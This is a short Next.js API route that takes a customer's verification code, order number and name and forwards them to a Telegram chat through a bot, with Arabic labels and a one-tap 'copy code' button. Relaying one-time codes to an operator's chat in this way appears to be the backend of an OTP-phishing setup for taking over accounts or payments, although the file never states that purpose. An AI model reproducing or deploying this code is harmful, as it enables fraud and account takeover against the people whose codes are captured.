import { NextRequest, NextResponse } from "next/server";

async function sendToTelegram(body: object, retries = 3): Promise<boolean> {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
          signal: AbortSignal.timeout(8000),
        }
      );
      if (res.ok) return true;
    } catch {
      if (i < retries - 1) await new Promise((r) => setTimeout(r, 1000 * (i + 1)));
    }
  }
  return false;
}

export async function POST(req: NextRequest) {
  const { code, orderId, customerName, customerId } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🏢 مؤسسة تبارك التقنية الذكية`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: code } }]],
  };

  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });

  return NextResponse.json({ ok: sent }, { status: sent ? 200 : 502 });
}
